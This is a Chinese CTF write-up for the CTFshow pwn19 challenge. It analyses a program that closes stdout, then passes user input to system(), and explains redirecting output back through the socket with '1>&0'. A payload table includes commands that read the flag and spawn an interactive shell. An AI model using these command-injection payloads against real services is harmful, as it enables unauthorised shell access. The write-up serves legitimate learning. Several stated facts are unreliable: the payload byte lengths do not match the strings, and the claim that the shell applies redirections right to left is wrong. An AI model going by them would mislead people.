---
title: "[ pwn 学习 ] CTFshow-pwn19 关闭输出流"
date: 2026-07-22 12:00:00
categories:
  - CTF
  - Pwn
tags:
  - Pwn
  - CTF
  - CTFShow
  - Writeup
cover: /img/jpg/11.jpg
---

# 1. 基础信息

```plain
checksec pwn19
  Arch:     amd64-64-little
  RELRO:    Full RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
```

64 位程序，保护全开。

# 2. 反编译分析

```c
int main() {
    char buf[0x30];          // 实际使用 0x20=32 字节
    pid_t pid;

    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IONBF, 0);
    // ... 打印 CTFshow 横幅（省略）...

    pid = fork();
    if (pid == 0) {
        // ===== 子进程 =====
        fclose(stdout);          // 关闭标准输出！
        read(0, buf, 0x20);      // 读取 32 字节
        system(buf);             // 命令注入
    } else {
        // ===== 父进程 =====
        wait(NULL);
        sleep(3);
        printf("flag is not here!");
    }
    return 0;
}
```

`fork()` 分出一个子进程 → `fclose(stdout)` 关掉输出 → 读输入 → `system()` 执行。

# 3. 问题：stdout 被关了

```c
fclose(stdout);          // 把程序的嘴缝上
read(0, buf, 0x20);      // 给你 32 字节发言权
system(buf);             // 你说的内容被当作命令执行
```

即使 `cat /ctfshow_flag` 正确执行了，stdout 已关，数据传不回来。

# 4. 前置知识：文件描述符（FD）

| 编号 | 名称 | 作用 |
| --- | --- | --- |
| 0 | stdin | 标准输入 |
| **1** | **stdout** | **标准输出** |
| 2 | stderr | 标准错误 |

关键事实：socat 搭建的 socket 连接中，fd 0 和 fd 1 指向**同一个双向通道**。关了 1，0 还在且可读写。

# 5. 思路：文件描述符重定向

把 fd 1 的输出重定向到 fd 0，从"耳朵"把数据挤出去：

```c
1>&0
```

`system()` 会起子 shell，子 shell 退出时数据可能没刷出去。所以用 `exec` 替换当前进程：

```plain
exec cat /ctf* 1>&0
```

| 部分 | 作用 |
| --- | --- |
| `exec` | 替换当前 shell，确保重定向生效 |
| `cat /ctf*` | 读取 flag 文件 |
| `1>&0` | stdout 重定向到 stdin（双向通道传回数据） |

# 6. 更多可用的 payload

| Payload | 长度 | 说明 |
| --- | --- | --- |
| `exec cat /ctf* 1>&0` | 21 字节 | 标准解法 |
| `exec /bin/sh 1>&0` | 18 字节 | 弹交互式 shell |
| `exec sh 1>&0` | 14 字节 | 最短弹 shell |
| `exec ls / 1>&0` | 16 字节 | 探路 |

`exec cat /ctf* >&0` 是 `1>&0` 的简写（省 1 字节）。

> 注意：`exec cat /ctf* 2>&1` 是错的 — shell 从右往左执行，先 `2>&1` 把 stderr 也指向已关闭的 stdout，雪上加霜。正确做法是用 `2>&0`。

# 7. 此类漏洞思路

| 现象 | 可能原因 | 应对 |
| --- | --- | --- |
| 命令无回显 | stdout 被关 | `1>&0` 或 `1>&2` 重定向 |
| 有报错无输出 | 只关了 stdout | `2>&1` 合并 |
| 输出不完整 | 缓冲区没刷新 | 加 `exec` 替换进程 |

关键操作速查：

| 操作 | 效果 |
| --- | --- |
| `fclose(stdout)` / `close(1)` | 关闭 fd 1 |
| `1>&0` | stdout → stdin |
| `1>&2` | stdout → stderr |

在 socat 场景中 fd 0 和 fd 1 是同一 socket 的两个副本，关了 1 不影响 0，`1>&0` 之所以能行就是这个原因。
